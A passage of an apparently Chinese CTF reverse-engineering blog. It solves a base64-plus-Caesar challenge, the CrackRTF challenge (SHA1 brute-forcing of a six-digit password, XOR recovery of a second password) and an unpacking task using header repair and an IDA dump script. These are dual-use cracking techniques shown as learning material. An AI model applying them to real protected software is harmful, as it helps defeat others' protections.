class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.9.0</span></span><br><span class="line"><span class="comment"># Python bytecode version base 2.7 (62211)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.6.8 (tags/v3.6.8:3c6b436a57, Dec 24 2018, 00:16:47) [MSC v.1916 64 bit (AMD64)]</span></span><br><span class="line"><span class="comment"># Embedded file name: re3.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2020-03-06 17:43:28</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">c_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + <span class="string">&#x27;()&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;BozjB3vlZ3ThBn9bZ2jhOH93ZaH9&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">##string.ascii_uppercase：所有的大写字母</span></span><br><span class="line"><span class="comment">##string.ascii_lowercase：所有的小写字母</span></span><br><span class="line"><span class="comment">##string.digits：所有的数字</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###base64加密算法python的实现</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">origin_bytes</span>):</span><br><span class="line">    c_bytes = [ (<span class="string">&#x27;&#123;:0&gt;8&#125;&#x27;</span>).<span class="built_in">format</span>(<span class="built_in">str</span>(<span class="built_in">bin</span>(b)).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)) <span class="keyword">for</span> b <span class="keyword">in</span> origin_bytes ]</span><br><span class="line">    <span class="comment">#将每一位bytes转换为二进制字符串 8位数字右对齐</span></span><br><span class="line">    </span><br><span class="line">    resp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    nums = <span class="built_in">len</span>(c_bytes) // <span class="number">3</span></span><br><span class="line">    remain = <span class="built_in">len</span>(c_bytes) % <span class="number">3</span></span><br><span class="line">    </span><br><span class="line">    integral_part = c_bytes[<span class="number">0</span>:<span class="number">3</span> * nums]</span><br><span class="line">    <span class="keyword">while</span> integral_part:</span><br><span class="line">        <span class="comment"># 取三个字节，以每6比特，转换为4个整数</span></span><br><span class="line">        tmp_unit = (<span class="string">&#x27;&#x27;</span>).join(integral_part[<span class="number">0</span>:<span class="number">3</span>])</span><br><span class="line">        tmp_unit = [ <span class="built_in">int</span>(tmp_unit[x:x + <span class="number">6</span>], <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">18</span>] ]</span><br><span class="line">        <span class="comment"># 取对应base64字符</span></span><br><span class="line">        resp += (<span class="string">&#x27;&#x27;</span>).join([ c_charset[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit ])</span><br><span class="line">        integral_part = integral_part[<span class="number">3</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> remain:</span><br><span class="line">        remain_part = (<span class="string">&#x27;&#x27;</span>).join(c_bytes[<span class="number">3</span> * nums:]) + (<span class="number">3</span> - remain) * <span class="string">&#x27;0&#x27;</span> * <span class="number">8</span></span><br><span class="line">        <span class="comment"># 补齐三个字节，每个字节补充 0000 0000</span></span><br><span class="line">        tmp_unit = [ <span class="built_in">int</span>(remain_part[x:x + <span class="number">6</span>], <span class="number">2</span>) <span class="keyword">for</span> x <span class="keyword">in</span> [<span class="number">0</span>, <span class="number">6</span>, <span class="number">12</span>, <span class="number">18</span>] ][:remain + <span class="number">1</span>]</span><br><span class="line">        resp += (<span class="string">&#x27;&#x27;</span>).join([ c_charset[i] <span class="keyword">for</span> i <span class="keyword">in</span> tmp_unit ]) + (<span class="number">3</span> - remain) * <span class="string">&#x27;.&#x27;</span></span><br><span class="line">        <span class="comment"># 取三个字节，以每6比特，转换为4个整数</span></span><br><span class="line">        <span class="comment"># 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充.</span></span><br><span class="line">    <span class="keyword">return</span> rend(resp)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rend</span>(<span class="params">s</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encodeCh</span>(<span class="params">ch</span>):</span><br><span class="line">        f = <span class="keyword">lambda</span> x: <span class="built_in">chr</span>((<span class="built_in">ord</span>(ch) - x + <span class="number">2</span>) % <span class="number">26</span> + x)</span><br><span class="line">        <span class="keyword">if</span> ch.islower():  <span class="comment">#检测字符是否都是小写 </span></span><br><span class="line">            <span class="keyword">return</span> f(<span class="number">97</span>)</span><br><span class="line">        <span class="keyword">if</span> ch.isupper():  <span class="comment">#检测字符是否都是大写</span></span><br><span class="line">            <span class="keyword">return</span> f(<span class="number">65</span>)</span><br><span class="line">        <span class="keyword">return</span> ch</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (<span class="string">&#x27;&#x27;</span>).join(encodeCh(c) <span class="keyword">for</span> c <span class="keyword">in</span> s)</span><br></pre></td></tr></table></figure></div><p>解读代码后直接写解密脚本</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line"></span><br><span class="line">c_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + <span class="string">&#x27;()&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;BozjB3vlZ3ThBn9bZ2jhOH93ZaH9&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rend</span>(<span class="params">ch</span>):</span><br><span class="line">        f = <span class="keyword">lambda</span> x: <span class="built_in">chr</span>((<span class="built_in">ord</span>(ch) - x + <span class="number">2</span>) % <span class="number">26</span> + x)</span><br><span class="line">        <span class="keyword">if</span> ch.islower():  <span class="comment">#检测字符是否都是小写 </span></span><br><span class="line">            <span class="keyword">return</span> f(<span class="number">97</span>)</span><br><span class="line">        <span class="keyword">if</span> ch.isupper():  <span class="comment">#检测字符是否都是大写</span></span><br><span class="line">            <span class="keyword">return</span> f(<span class="number">65</span>)</span><br><span class="line">        <span class="keyword">return</span> ch</span><br><span class="line">    </span><br><span class="line">tmp=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> flag:</span><br><span class="line">    tmp+=rend(ch)</span><br><span class="line"><span class="built_in">print</span>(tmp)</span><br><span class="line"><span class="built_in">print</span>(base64.b64decode(tmp))</span><br><span class="line"></span><br><span class="line"><span class="comment">##中间的是base64加密 是可以看出来的 先得到后面加密后的密文 再进行base64的解密</span></span><br><span class="line"><span class="comment">##需要注意的是别把文件起叫base64.py ！！会和模块包名字起冲突！！</span></span><br></pre></td></tr></table></figure></div><hr><h4 id="第二种思路"><a href="#第二种思路" class="headerlink" title="第二种思路"></a>第二种思路</h4><p>分为两段代码 一段是换表的base64加密，另一段是位移两位的凯撒密码加密</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import string</span><br><span class="line">c_charset = string.ascii_uppercase + string.ascii_lowercase + string.digits + &#x27;()&#x27;</span><br><span class="line">flag = &#x27;BozjB3vlZ3ThBn9bZ2jhOH93ZaH9&#x27;</span><br><span class="line"></span><br><span class="line">def encode(origin_bytes):</span><br><span class="line">    c_bytes = [ (&#x27;&#123;:0&gt;8&#125;&#x27;).format(str(bin(b)).replace(&#x27;0b&#x27;, &#x27;&#x27;)) for b in origin_bytes ]</span><br><span class="line">    #将每一位bytes转换为二进制字符串 8位数字右对齐</span><br><span class="line">    </span><br><span class="line">    resp = &#x27;&#x27;</span><br><span class="line">    nums = len(c_bytes) // 3</span><br><span class="line">    remain = len(c_bytes) % 3</span><br><span class="line">    </span><br><span class="line">    integral_part = c_bytes[0:3 * nums]</span><br><span class="line">    while integral_part:</span><br><span class="line">        # 取三个字节，以每6比特，转换为4个整数</span><br><span class="line">        tmp_unit = (&#x27;&#x27;).join(integral_part[0:3])</span><br><span class="line">        tmp_unit = [ int(tmp_unit[x:x + 6], 2) for x in [0, 6, 12, 18] ]</span><br><span class="line">        # 取对应base64字符</span><br><span class="line">        resp += (&#x27;&#x27;).join([ c_charset[i] for i in tmp_unit ])</span><br><span class="line">        integral_part = integral_part[3:]</span><br><span class="line"></span><br><span class="line">    if remain:</span><br><span class="line">        remain_part = (&#x27;&#x27;).join(c_bytes[3 * nums:]) + (3 - remain) * &#x27;0&#x27; * 8</span><br><span class="line">        # 补齐三个字节，每个字节补充 0000 0000</span><br><span class="line">        tmp_unit = [ int(remain_part[x:x + 6], 2) for x in [0, 6, 12, 18] ][:remain + 1]</span><br><span class="line">        resp += (&#x27;&#x27;).join([ c_charset[i] for i in tmp_unit ]) + (3 - remain) * &#x27;.&#x27;</span><br><span class="line">        # 取三个字节，以每6比特，转换为4个整数</span><br><span class="line">        # 剩余1字节可构造2个base64字符，补充==；剩余2字节可构造3个base64字符，补充.</span><br><span class="line">    return rend(resp)</span><br></pre></td></tr></table></figure></div><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def rend(s):</span><br><span class="line"></span><br><span class="line">    def encodeCh(ch):</span><br><span class="line">        f = lambda x: chr((ord(ch) - x + 2) % 26 + x)</span><br><span class="line">        if ch.islower():  #检测字符是否都是小写 </span><br><span class="line">            return f(97)</span><br><span class="line">        if ch.isupper():  #检测字符是否都是大写</span><br><span class="line">            return f(65)</span><br><span class="line">        return ch</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>反过来就是先将 ‘BozjB3vlZ3ThBn9bZ2jhOH93ZaH9’ 凯撒密码位移两位解码，再base64换表解密 得到flag</p><h1 id="CTFSHOW-BUUCTF-20230412"><a href="#CTFSHOW-BUUCTF-20230412" class="headerlink" title="CTFSHOW-BUUCTF-20230412"></a>CTFSHOW-BUUCTF-20230412</h1><h2 id="CrackRTF"><a href="#CrackRTF" class="headerlink" title="CrackRTF"></a>CrackRTF</h2><p>加密算法的标识码：<br><a class="link"   href="https://learn.microsoft.com/en-us/windows/win32/seccrypto/alg-id" >https://learn.microsoft.com/en-us/windows/win32/seccrypto/alg-id <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681387669789-d531d758-1613-4374-b0fa-34ac942de123.png"                      alt="image.png"                ><br>读反汇编代码<br>发现主要的思路就是上图这样，输入两次密码，分别定义为：input_1和input_2<br>input_1输入后会进行一次加密，进入加密算法，通过0x8004u知道该密码标识符是sha1加密算法，即input_1+“@DBApp”赋值input_1&#x3D;&#x3D;SHA1&#x3D;&#x3D;&gt; “6E32D0943418C2C33385BC35A1470250DD8923A9”<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681387794231-3cf55ef5-c561-4f94-9379-4a3bd5e6d426.png"                      alt="image.png"                ><br>写出碰撞的加密脚本</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">flag2=<span class="string">&#x27;@DBApp&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">100000</span>,<span class="number">999999</span>):</span><br><span class="line">    h2 = hashlib.<span class="built_in">sha1</span>((<span class="built_in">str</span>(i)+flag2).<span class="built_in">encode</span>(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">    flags = h2.<span class="built_in">hexdigest</span>()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;6e32d0943418c2c33385bc35a1470250dd8923a9&quot;</span> == flags: ##全小写</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>(i)+flag2) </span><br><span class="line">            <span class="built_in">print</span>(flags)</span><br></pre></td></tr></table></figure></div><p>同样的方法，找到密码标识符后，确定是MD5加密方法，接着向下input_2+前面的input_1（加上“@DBApp”后）&#x3D;&#x3D;MD5&#x3D;&#x3D;&gt; “27019e688a4e62a649fd99cadaafdb4e” 求得input_2&#x3D;&#x3D; “<del>!3a@0”   (爆破的方法似乎行不通，不知道为啥这个<a class="link"   href="https://www.somd5.com/" >MD5破解网站  <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>可以 magic</del>)<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681388197504-58b2fddf-ba1f-4a53-b40a-fdda82175202.png"                      alt="image.png"                ><br>得到dbapp.rtf文件获得flag文件<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681388244869-3767b3f8-188f-4c68-bf99-0e0427084ef3.png"                      alt="image.png"                ></p><hr><p>存在的非预期解是在最后的函数里，存在一个调用函数<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681388309249-d126b2a2-50d9-4400-8156-4bb3a33b6fbe.png"                      alt="image.png"                ><br>一个一个去查函数的作用，主要作用是将一个资源中的数据写入到一个名为”dbapp.rtf“文件中去，其他各个函数的含义：<br>FindResourceA 查找资源 参数包括资源 ID (0x65) 和资源类型 (“AAA”)。<br>SizeofResource 获取资源的大小 LoadResource 加载资源 LockResource 锁定资源<br>调用另一个函数 sub_401005，作用是将第一个参数 lpString 中的字符串与 lpBuffer 中的数据进行处理，即与前6个字符的异或，并将处理结果存储到 lpBuffer 中。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681390515436-78837483-4443-4bc8-b766-ac8f1a43a215.png"                      alt="image.png"                ></p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">passwd1 = <span class="string">&quot;6e32d0943418c2c33385bc35a1470250dd8923a9&quot;</span></span><br><span class="line">passwd2 = <span class="string">&quot;27019e688a4e62a649fd99cadaafdb4e&quot;</span></span><br><span class="line">suffix = <span class="string">&quot;@DBApp&quot;</span></span><br><span class="line">aaa = [<span class="number">0x5</span>, <span class="number">0x7d</span>, <span class="number">0x41</span>, <span class="number">0x15</span>, <span class="number">0x26</span>, <span class="number">0x1</span>]<span class="comment">#AAA资源的前6个字节</span></span><br><span class="line">rtf_header = [<span class="number">0x7b</span>, <span class="number">0x5c</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x66</span>, <span class="number">0x31</span>] <span class="comment"># RTF文件头前6给字节</span></span><br><span class="line"></span><br><span class="line">pass1 = <span class="string">&quot;&quot;</span></span><br><span class="line">pass2 = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100000</span>,<span class="number">1000000</span>):</span><br><span class="line">    instr = <span class="built_in">str</span>(i) + suffix</span><br><span class="line">    res = hashlib.sha1(instr.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> res == passwd1:</span><br><span class="line">        pass1 = <span class="built_in">str</span>(i)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;passwd1 = &quot;</span>, pass1)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    res = aaa[i] ^ rtf_header[i]</span><br><span class="line">    pass2 += <span class="built_in">chr</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;passwd2 = &quot;</span>, pass2)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h1 id="CTFSHOW-二进制玩家人均全栈"><a href="#CTFSHOW-二进制玩家人均全栈" class="headerlink" title="CTFSHOW 二进制玩家人均全栈"></a>CTFSHOW 二进制玩家人均全栈</h1><p>首先得到的是一个名叫zip的文件，用010打开查看，发现是个PK文件头的压缩文件，但是发现是的与正常压缩包文件的前几个字节存在偏差，所以需要手动修复文件<br>修改前文件<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681537591631-288e8a81-1be4-479e-9791-e32ff7368ef9.png"                      alt="image.png"                ><br>修改后的文件<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681538025106-3f33f9bf-d93f-41b6-9802-fa97ba2bc659.png"                      alt="image.png"                ><br>个人觉得这一步不需要 ，14 00两位是使用的PKware的版本，08 00判断是否有加密，如果直接用更改后缀名的方式也是可以实现的<br>解出一个无后缀的文件，放在ubantu发现执行不了这个文件，原因是文件头错误，所以需要更改文件头继续执行文件。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681539824669-62456b75-dac2-4f38-8fc4-2a464ea1c21e.png"                      alt="image.png"                ><br>查看原来文件头的数据，并更改成正确的elf文件的文件头</p><blockquote><p>PE文件文件头数据是：<code>4D 5A 90 00</code><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681540707194-721297a9-68bf-4b93-8bab-6d7b5a926106.png"                      alt="image.png"                ><br>ELF文件文件头数据是：<code>7F 45 4C 46</code><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681540749100-142f0174-8057-404a-a124-2e602ed8f2c2.jpeg"                      alt="v2-80cb4f8fe1c2f4225bac1b2147cfab5b_720w.jpg"                ><br>电脑暂时没有ELF文件，盗了张图（<a class="link"   href="https://zhuanlan.zhihu.com/p/602763051" >原链接戳这里 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)</p></blockquote><p>更改后重新测试，说明文件就改好了撒花(误<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681540912161-481ecd58-fb69-4500-9b51-1b82af9bb6ab.png"                      alt="image.png"                ><br>之后正常地分析文件，发现还需要将upx壳脱掉，自动脱壳。。。脱不掉。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681555655997-7bfb4b74-17fc-46bd-be51-404b6a34114c.png"                      alt="image.png"                ></p><h4 id="planA-dumpfile脚本脱壳"><a href="#planA-dumpfile脚本脱壳" class="headerlink" title="planA:dumpfile脚本脱壳"></a>planA:dumpfile脚本脱壳</h4><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;idc.idc&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_LOAD              1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PT_DYNAMIC           2</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">         <span class="keyword">auto</span> ImageBase,StartImg,EndImg;</span><br><span class="line">         <span class="keyword">auto</span> e_phoff;</span><br><span class="line">         <span class="keyword">auto</span> e_phnum,p_offset;</span><br><span class="line">         <span class="keyword">auto</span> i,dumpfile;</span><br><span class="line">         ImageBase=<span class="number">0x400000</span>;</span><br><span class="line">         StartImg=<span class="number">0x400000</span>;</span><br><span class="line">         EndImg=<span class="number">0x0</span>;</span><br><span class="line">         <span class="keyword">if</span> (<span class="built_in">Dword</span>(ImageBase)==<span class="number">0x7f454c46</span> || <span class="built_in">Dword</span>(ImageBase)==<span class="number">0x464c457f</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span>(dumpfile=<span class="built_in">fopen</span>(<span class="string">&quot;C:\\TOOLS\\dumpfile&quot;</span>,<span class="string">&quot;wb&quot;</span>)) <span class="comment">//需要更改文件的路径(若没有的需要新建dumpfile无后缀文件,双斜线)</span></span><br><span class="line">    &#123;</span><br><span class="line">      e_phoff=ImageBase+<span class="built_in">Qword</span>(ImageBase+<span class="number">0x20</span>);</span><br><span class="line">      <span class="built_in">Message</span>(<span class="string">&quot;e_phoff = 0x%x\n&quot;</span>, e_phoff);</span><br><span class="line">      e_phnum=<span class="built_in">Word</span>(ImageBase+<span class="number">0x38</span>);</span><br><span class="line">      <span class="built_in">Message</span>(<span class="string">&quot;e_phnum = 0x%x\n&quot;</span>, e_phnum);</span><br><span class="line">      <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;e_phnum;i++)</span><br><span class="line">      &#123;</span><br><span class="line">         <span class="keyword">if</span> (<span class="built_in">Dword</span>(e_phoff)==PT_LOAD || <span class="built_in">Dword</span>(e_phoff)==PT_DYNAMIC)</span><br><span class="line">                         &#123; </span><br><span class="line">                                 p_offset=<span class="built_in">Qword</span>(e_phoff+<span class="number">0x8</span>);</span><br><span class="line">                                 StartImg=<span class="built_in">Qword</span>(e_phoff+<span class="number">0x10</span>);</span><br><span class="line">                                 EndImg=StartImg+<span class="built_in">Qword</span>(e_phoff+<span class="number">0x28</span>);</span><br><span class="line">                                 <span class="built_in">Message</span>(<span class="string">&quot;start = 0x%x, end = 0x%x, offset = 0x%x\n&quot;</span>, StartImg, EndImg, p_offset);</span><br><span class="line">                                 <span class="built_in">dump</span>(dumpfile,StartImg,EndImg,p_offset);</span><br><span class="line">                                 <span class="built_in">Message</span>(<span class="string">&quot;dump segment %d ok.\n&quot;</span>,i);</span><br><span class="line">                         &#125;    </span><br><span class="line">         e_phoff=e_phoff+<span class="number">0x38</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">fseek</span>(dumpfile,<span class="number">0x3c</span>,<span class="number">0</span>);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">fseek</span>(dumpfile,<span class="number">0x28</span>,<span class="number">0</span>);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line">      <span class="built_in">fputc</span>(<span class="number">0x00</span>,dumpfile);</span><br><span class="line"></span><br><span class="line">      <span class="built_in">fclose</span>(dumpfile);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="built_in">Message</span>(<span class="string">&quot;dump err.&quot;</span>);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="title">dump</span><span class="params">(dumpfile,startimg,endimg,offset)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">auto</span> i;</span><br><span class="line">        <span class="keyword">auto</span> size;</span><br><span class="line">        size=endimg-startimg;</span><br><span class="line">        <span class="built_in">fseek</span>(dumpfile,offset,<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">for</span> ( i=<span class="number">0</span>; i &lt; size; i=i+<span class="number">1</span> ) </span><br><span class="line">        &#123;</span><br><span class="line">        <span class="built_in">fputc</span>(<span class="built_in">Byte</span>(startimg+i),dumpfile);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>下断点进行动态调式，找到oep(程序的入口点 <a class="link"   href="https://baike.baidu.com/item/OEP/4885720?fr=aladdin" >What is OEP？ <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>)<br>首先，retn指令下断点F9跳到断点处<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681553621822-e17a2b26-e615-41ca-b2be-12b49ff7c29f.png"                      alt="image.png"                ><br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681553690818-5fccf4f1-24bd-4513-bb0d-2922dd5f0b24.png"                      alt="3032507-20230208105713953-267849918.png"                ><br>1.F8单步执行，找下一个retn指令<br>2.在retn处下断点，F9跳过，F8单步<br>3.继续向下找retn重复2步骤<br>重复个几次，之后一直F8，最终到达这里。<br><img                       lazyload                     src="/images/loading.svg"                     data-src="/../Post_images/NKCTF-20230328.assets/1681554012163-4de2fa74-465e-4c60-9155-74b429ed66a4.png"                      